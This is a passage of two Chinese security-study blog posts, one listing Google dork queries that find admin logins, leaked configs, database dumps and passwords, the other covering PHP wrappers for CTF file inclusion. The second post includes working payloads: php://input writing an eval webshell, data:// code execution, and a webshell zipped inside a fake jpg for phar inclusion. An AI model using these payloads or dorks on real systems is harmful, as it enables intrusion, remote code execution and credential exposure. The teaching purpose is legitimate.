        <content type="html"><![CDATA[<h2 id="Google-Hack"><a href="#Google-Hack" class="headerlink" title="Google Hack"></a>Google Hack</h2><p><img src="https://s2.loli.net/2023/08/08/2lImhOtdqKgnkx5.png" alt="image.png"></p><p>下面我们先来看看Google的部分语法：</p><ul><li>intitle：搜索网页标题中包含有特定字符的网页。例如输入“intitle:ph p”，这样网页标题中带有php的网页都会被搜索出来。</li><li>inurl：搜索包含有特定字符的URL。例如输入“inurl:php”，则可以找到带有php字符的URL。</li><li>intext:搜索网页正文内容中的指定字符，例如输入“intext:php”。这个语法类似我们平时在某些网站中使用的“文章内容搜索”功能。</li><li>Filetype:搜索指定类型的文件。例如输入“filetype:php”，将返回所有以php结尾的文件URL。</li><li>Site：找到与指定网站有联系的URL。例如输入“Site：soho51.com”。所有和这个网站有联系的URL都会被显示。</li></ul><p>这些就是Google的常用语法，也是Google Hack的必用语法。虽然这只是Google语法中很小的部分，但是合理使用这些语法将产生意想不到的效果。</p><h3 id="GoogleHacking常用语法"><a href="#GoogleHacking常用语法" class="headerlink" title="GoogleHacking常用语法"></a>GoogleHacking常用语法</h3><ol><li>intext：（仅针对Google有效） 把网页中的正文内容中的某个字符作为搜索的条件</li><li>intitle：把网页标题中的某个字符作为搜索的条件</li><li>cache：搜索搜索引擎里关于某些内容的缓存，可能会在过期内容中发现有价值的信息</li><li>filetype：指定一个格式类型的文件作为搜索对象</li><li>inurl：搜索包含指定字符的URL</li><li>site：在指定的(域名)站点搜索相关内容</li><li>Index of：　查找允许目录浏览的页面，比方说我想看看/admin目录下的文件（部分网站因为配置疏忽的原因，导致目录可以被所有人访问，目录的文件也可以被下载）</li></ol><h3 id="其他常见且实用的语法"><a href="#其他常见且实用的语法" class="headerlink" title="其他常见且实用的语法"></a>其他常见且实用的语法</h3><p>1、引号 ” ” 把关键字打上引号后，把引号部分作为整体来搜索2、or同时搜索两个或更多的关键字3、link搜索某个网站的链接 link:baidu.com即返回所有和baidu做了链接的URL4、info 查找指定站点的一些基本信息</p><h3 id="常见漏洞搜索举例："><a href="#常见漏洞搜索举例：" class="headerlink" title="常见漏洞搜索举例："></a>常见漏洞搜索举例：</h3><p>1.管理后台地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">site:target.com intext:管理</span><br><span class="line">site:target.com intext:后台</span><br><span class="line">site:target.com intext:登陆</span><br><span class="line">site:target.com intext:用户名</span><br><span class="line">site:target.com intext:login</span><br><span class="line">systemsite:target.com inurl:login |</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">inurl:admin</span><br><span class="line">inurl:manage</span><br><span class="line">inurl:manager</span><br><span class="line">inurl:admin_login</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">inurl:system | inurl:backendsite:target.com intitle:管理</span><br><span class="line">inurl:system |inurl:backendsite:target.com intitle:登录</span><br><span class="line">inurl:system | inurl:backendsite:target.com intitle:后台管理</span><br></pre></td></tr></table></figure><p>2.上传类漏洞地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">site:target.com</span><br><span class="line">inurl:filesite:target.com</span><br><span class="line">inurl:upload</span><br></pre></td></tr></table></figure><p>3.注入页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:target.com inurl:php/asp?id=（批量注入工具、结合搜索引擎）inurl:Show.asp?Id=</span><br></pre></td></tr></table></figure><p>4.编辑器页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:target.com</span><br><span class="line">inurl:ewebeditor</span><br></pre></td></tr></table></figure><p>5.目录遍历漏洞<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:target.com</span><br><span class="line">intitle:index.of</span><br></pre></td></tr></table></figure></p><p>6.SQL错误</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:target.com intext:&quot;sql syntax near&quot; | intext:&quot;syntax error has occurred&quot; | intext:&quot;incorrect syntax near&quot; | intext:&quot;unexpected endofSQLcommand&quot; | intext:&quot;Warning: mysql_connect()&quot; | intext:”Warning: mysql_query()&quot;| intext:”Warning: pg_connect()&quot;phpinfo()</span><br><span class="line">site:target.com ext:php intitle:phpinfo &quot;</span><br></pre></td></tr></table></figure><p>7.配置文件泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">site:target.com ext:.xml</span><br><span class="line">site:target.com ext:.ini</span><br><span class="line">site:target.com ext:.conf </span><br><span class="line">site:target.com ext:.inf</span><br></pre></td></tr></table></figure><p>8.数据库文件泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:target.com ext:.sql | .dbf | .mdb | .db 日志文件泄露</span><br><span class="line">site:target.com ext:.log</span><br></pre></td></tr></table></figure><p>9.备份和历史文件泄露<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">site:target.com ext:.bkf</span><br><span class="line">site:target.com ext:.old</span><br><span class="line">site:target.com ext:.zip</span><br><span class="line">site:target.com ext:.tar</span><br></pre></td></tr></table></figure></p><p>10.公开文件泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">site:target.com filetype:.doc</span><br><span class="line">site:target.com filetype:.ppt</span><br><span class="line">site:target.com filetype:.xlsx</span><br><span class="line">site:target.com filetype:.csv</span><br><span class="line">site:target.com filetype:.psw</span><br></pre></td></tr></table></figure><p>11.邮箱信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:target.com intext:@target.com</span><br><span class="line">site:target.com 邮件site:target.com email</span><br></pre></td></tr></table></figure><p>12.社工信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">site:target.com intitle:账号</span><br><span class="line">site:target.com intitle:密码</span><br><span class="line">site:target.com intitle:工号</span><br><span class="line">site:target.com intitle:学号</span><br><span class="line">site:target.com intitle:身份证</span><br></pre></td></tr></table></figure><p>13.查找网站管理后台</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">site:xxx intitle:管理|后台|登录|用户名|密码|验证码|系统|账号|后台管理|后台登录</span><br><span class="line">site:xxx intext:管理|后台|登录|用户名|密码|验证码|系统|账号|后台管理|后台登录</span><br><span class="line">site:xxx.com intext:</span><br><span class="line">site:xxxx.com intext:管理 </span><br><span class="line">site:xxxx.com inurl:login </span><br><span class="line">site:xxxx.com intitle:管理</span><br></pre></td></tr></table></figure><p>14.查找邮箱及其配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">site:xxx.com smtp</span><br><span class="line">site:xxx.com smtp @qq.com </span><br><span class="line">site:xxx.com smtp @126.com</span><br><span class="line">site:xxx.com smtp @163.com</span><br><span class="line">site:xxx.com smtp @sina.com.cn</span><br><span class="line">site:xxx.com smtp password</span><br></pre></td></tr></table></figure><p>15.数据库信息泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">site:xxx.com sa password</span><br><span class="line">site:xxx.com root password</span><br><span class="line">site:xxx.com User ID=&#x27;sa&#x27;;Password</span><br></pre></td></tr></table></figure><p>16.敏感信息搜索</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">site:xxx inurl:file</span><br><span class="line">site:xxx inurl:load</span><br><span class="line">site:xxx inurl:php?id=</span><br><span class="line">site:xxx inurl:asp?id=</span><br><span class="line">site:xxx inurl:fck</span><br><span class="line">site:xxx inurl:ewebeditor</span><br><span class="line">cache：xxx.com               搜索服务器缓存</span><br></pre></td></tr></table></figure><p>17.寻找特定漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">site:域名 inurl:php?id= </span><br><span class="line"></span><br><span class="line">site:xxx inurl:login　　　　　　　搜索xxx网站login页面是否存在sql注入</span><br><span class="line">inurl:login.php                               搜索网址中含有login.php网页</span><br><span class="line">intitle:后台管理 filetype:php          搜索标题是后台管理的php页面</span><br><span class="line">intitle:index of&quot;parent directory&quot;搜索根目录星官的索引目录信息</span><br><span class="line">intext:Powered bywordpress       搜索word press制作的博客网址</span><br><span class="line">intext:Powered by*CMS              搜索*CMS相关的页面</span><br><span class="line">intext:powered byxxx inurl:login  搜索此类网站的后台登陆页面</span><br><span class="line">parent directory site:xxx               搜索xxx网站的目录结构</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web笔记 </tag>
            
            <tag> Googlehack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php伪协议的学习</title>
      <link href="/posts/fes5.html"/>
      <url>/posts/fes5.html</url>
      
        <content type="html"><![CDATA[<h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><p>php支持的伪协议如下：（<a href="https://www.php.net/manual/zh/wrappers.php">PHP: 支持的协议和封装协议 - Manual</a>）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line">http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line">ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line">php:<span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line">zlib:<span class="comment">// — 压缩流</span></span><br><span class="line">data:<span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line">glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line">phar:<span class="comment">// — PHP 归档</span></span><br><span class="line">ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line">rar:<span class="comment">// — RAR</span></span><br><span class="line">ogg:<span class="comment">// — 音频流</span></span><br><span class="line">expect:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure><blockquote><p>在php.ini中，allow_url_fopen 和allow_url_include会影响到fopen等等和include等等函数对于伪协议的支持； 且allow_url_include依赖allow_url_fopen，所以allow_url_fopen不开启的话，allow_url_include也是无法使用的</p></blockquote><h2 id="file-协议"><a href="#file-协议" class="headerlink" title="file:// 协议"></a>file:// 协议</h2><ul><li><p>file:// — 访问本地文件系统； ctf中常用于读取本地文件、配合curl_exec实现任意文件读取（curl支持伪协议）</p></li><li><p>条件：</p><ul><li>allow_url_fopen:off/on</li><li>allow_url_include :off/on</li></ul></li><li><p>作用：<br>  用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。<br>  include()/require()/include_once()/require_once()参数可控的情况下，如导入为非.php文件，则仍按照php语法进行解析，这是include()函数所决定的。</p></li><li><p>说明：<br>  file:// 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 fopen() 和 file_get_contents()，include_path 会可选地搜索，也作为相对的路径。</p></li><li><p>用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?xxx=file://文件的绝对路径和文件名</span><br><span class="line"></span><br><span class="line">eg: ?xxx=file://C:/Users/hungs/Desktop/eg.txt</span><br><span class="line"></span><br><span class="line">file://[文件的绝对路径和文件名]</span><br><span class="line">file://[文件的相对路径和文件名]</span><br><span class="line">file://[文件的网络路径和文件名]  </span><br></pre></td></tr></table></figure></li></ul><h2 id="http-amp-https-协议"><a href="#http-amp-https-协议" class="headerlink" title="http:// &amp; https:// 协议"></a>http:// &amp; https:// 协议</h2><ul><li>条件：<ul><li>allow_url_fopen:on</li><li>allow_url_include :on</li></ul></li><li>作用：常规 URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</li><li>用法：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://example.com</span><br><span class="line">http://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">http://user:password@example.com</span><br><span class="line">https://example.com</span><br><span class="line">https://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">https://user:password@example.com</span><br><span class="line"></span><br><span class="line">eg:</span><br><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure></li></ul><h2 id="php-协议"><a href="#php-协议" class="headerlink" title="php:// 协议"></a>php:// 协议</h2><ul><li><p><strong>条件</strong>：</p><ul><li>allow_url_fopen:off/on</li><li>allow_url_include :仅php://input php://stdin      php://memory php://temp 需要on</li></ul></li><li><p><strong>作用</strong>：php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于<strong>读取源码</strong>，php://input用于<strong>执行php代码</strong>。</p></li><li><p><strong>说明</strong>：PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p></li></ul><div class="table-container"><table><thead><tr><th><strong>协议</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>php://input</td><td>可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype=”multipart/form-data” 的时候php://input 是无效的。</td></tr><tr><td>php://output</td><td>只写的数据流，允许以  print 和 echo 一样的方式写入到输出缓冲区。</td></tr><tr><td>php://fd</td><td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 php://fd/3 引用了文件描述符 3。</td></tr><tr><td>php://memory  php://temp</td><td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 php://memory 总是把数据储存在内存中，而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 sys_get_temp_dir() 的方式一致。</td></tr><tr><td>php://filter</td><td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。</td></tr></tbody></table></div><p><strong>php://filter参数详解</strong>：该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p><div class="table-container"><table><thead><tr><th><strong>php://filter参数</strong></th><th><strong>描述</strong></th><th></th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>必须项。它指定了你要筛选过滤的数据流。</td><td></td></tr><tr><td>read=&lt;读链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（*\</td><td>*）分隔。</td></tr><tr><td>write=&lt;写链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（\</td><td>）分隔。</td></tr><tr><td>&lt;;  两个链的过滤器&gt;</td><td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链。</td></tr></tbody></table></div><p><strong>可用的过滤器列表（4类）</strong>：此处列举主要的过滤器类型，详细内容请参考：<a href="https://link.segmentfault.com/?enc=qj5AtjN9T4nKXd35G%2Be%2FGQ%3D%3D.T8xfksAALHxWxpIBCTGQqyxEXnerbeIHgd7Cc4CtqHf6%2FI%2FdjMh7DVCzS%2BYKx%2B1I">https://www.php.net/manual/zh/filters.php</a></p><div class="table-container"><table><thead><tr><th><strong>字符串过滤器</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>string.rot13</td><td>等同于str_rot13()，rot13变换</td></tr><tr><td>string.toupper</td><td>等同于strtoupper()，转大写字母</td></tr><tr><td>string.tolower</td><td>等同于strtolower()，转小写字母</td></tr><tr><td>string.strip_tags</td><td>等同于strip_tags()，去除html、PHP语言标签</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th><strong>转换过滤器</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>convert.base64-encode  &amp; convert.base64-decode</td><td>等同于base64_encode()和base64_decode()，base64编码解码</td></tr><tr><td>convert.quoted-printable-encode  &amp; convert.quoted-printable-decode</td><td>quoted-printable  字符串与 8-bit 字符串编码解码</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th><strong>压缩过滤器</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>zlib.deflate  &amp; zlib.inflate</td><td>在本地文件系统中创建  gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td></tr><tr><td>bzip2.compress  &amp; bzip2.decompress</td><td>同上，在本地文件系统中创建  bz2 兼容文件的方法。</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th><strong>加密过滤器</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>mcrypt.*</td><td>libmcrypt  对称加密算法</td></tr><tr><td>mdecrypt.*</td><td>libmcrypt  对称解密算法</td></tr></tbody></table></div><p>举例<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、php://filter/read=convert.base64-encode/resource=[文件名]读取文件源码（针对php文件需要base64编码）</span><br><span class="line"></span><br><span class="line">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br><span class="line"></span><br><span class="line">2、http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?phpfputs(fopen(&#x27;1juhua.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;); ?&gt;</span><br></pre></td></tr></table></figure></p><h2 id="zip-amp-bzip2-amp-zlib-协议"><a href="#zip-amp-bzip2-amp-zlib-协议" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib:// 协议"></a>zip:// &amp; bzip2:// &amp; zlib:// 协议</h2><ul><li>条件：<ul><li>allow_url_fopen:off/on</li><li>allow_url_include :off/on</li></ul></li><li>作用：zip:// &amp; bzip2:// &amp; zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1、zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]（#编码为%23）</span><br><span class="line">压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</span><br><span class="line">http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</span><br><span class="line"></span><br><span class="line">2、compress.bzip2://file.bz2</span><br><span class="line">压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</span><br><span class="line">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</span><br><span class="line"></span><br><span class="line">3、compress.zlib://file.gz</span><br><span class="line">压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</span><br><span class="line">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data:// 协议"></a>data:// 协议</h2><ul><li>条件：<ul><li>allow_url_fopen:on</li><li>allow_url_include :on</li></ul></li><li>作用：自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</li><li>用法：<ul><li><code>data://text/plain,</code>  </li><li><code>data://text/plain;base64,</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. data://text/plain,</span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">2、data://text/plain;base64,</span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h2><ul><li><p>phar:// — PHP 归档，将多个文件组合成一个文件</p></li><li><p>不受<code>allow_url_fopen</code>、<code>allow_url_include</code>影响</p></li><li><p>运用：</p><p><strong>1、绕过上传限制</strong></p><p>可以利于phar://绕过一些上传限制，多数情况下搭配文件包含使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造木马shell.php-&gt;(压缩)xxx.zip-&gt;(修改后缀)xxx.jpg-&gt;上传-&gt;phar://xxx.jpg/shell.php</span></span><br><span class="line"><span class="number">1</span>、构造木马 shell.php: </span><br><span class="line">    <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="number">2</span>、将shell.php压缩，并修改后缀名为jpg：xxx.<span class="title function_ invoke__">jpg</span>(实际是带有文件shell.php但修改了后缀名的压缩包)</span><br><span class="line"><span class="number">3</span>、上传xxx.jpg并配合文件包含解析木马（payload：<span class="string">&#x27;phar://xxx.jpg/shell.php&#x27;</span>）：</span><br><span class="line">    <span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;phar://xxx.jpg/shell.php&#x27;</span>);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p><strong>phar反序列化漏洞</strong></p><ul><li><p>（ps : 也是反序列化漏洞，但无需借助unserialize()函数）</p></li><li><p>PHP反序列化漏洞通常是<strong>借助unserialize()函数</strong> 但<strong>利用phar:// 伪协议</strong>也可以触发PHP反序列化漏洞： 1、phar文件以序列化的形式存储用户自定义的meta-data； 2、当使用phar://读取phar文件时，就会反序列化meta-data储存的信息</p></li><li><p><strong>利用条件</strong>：(ps:由此可以知道如何修复漏洞咯~) <code>可以上传phar文件</code> <code>有可用魔术方法</code> <code>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤</code></p></li><li><p><strong>受影响的文件操作函数</strong>：(参考 zsx师傅<a href="https://blog.zsxsoft.com/post/38">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a>)可知： 除了<code>所有文件函数</code>，只要是函数的实现过程直接或间接调用了<code>php_stream_open_wrapper</code>的函数，都可能触发phar反序列化漏洞（具体看zsx师傅的博客，写的很明了~） <img src="https://i.loli.net/2021/02/25/MT25UaKWSXCAl9i.png" alt="源自创宇测试"></p></li><li><p>phar文件： 在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发</p><ul><li><code>php&gt;=5.3</code>：默认开启支持<code>Phar</code>，文件状态为只读(<code>phar.readonly=on</code>)，而且使用phar文件不需要任何配置。php使用phar://伪协议来解析phar文件的内容。 ps：需<code>php.ini</code>中令 <code>phar.readonly=off</code>并去掉其前面的分号<code>;</code>否则无法生成phar文件</li></ul></li><li><p>phar文件结构：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. stub</span><br><span class="line">phar文件的标志，必须以 xxx <span class="title function_ invoke__">__HALT_COMPILER</span>();<span class="meta">?&gt;</span> 结尾，否则phar不会识别此部分。xxx可以为自定义内容。</span><br><span class="line"><span class="number">2</span>. manifest</span><br><span class="line">phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分会以序列化的形式存储用户自定义的meta-data，这里是漏洞利用的关键所在,正是因为meta-data是以序列化的形式存储</span><br><span class="line"><span class="number">3</span>. content</span><br><span class="line">被压缩文件的内容，通常情况下这里是可以随意输入的</span><br><span class="line"><span class="number">4</span>. <span class="title function_ invoke__">signature</span> (可空)</span><br><span class="line">签名，放在末尾。</span><br></pre></td></tr></table></figure></li><li>demo:<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Phar create done&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;test.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>);<span class="comment">#.phar文件，(后缀名必须为phar)</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php  __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">#stub(1)</span></span><br><span class="line"><span class="comment">#检测图片头时，可以添加gif头来绕过：GIF89a</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$o</span>-&gt;<span class="keyword">string</span> = <span class="string">&quot;bphar&quot;</span>;<span class="comment">#类的属性</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span 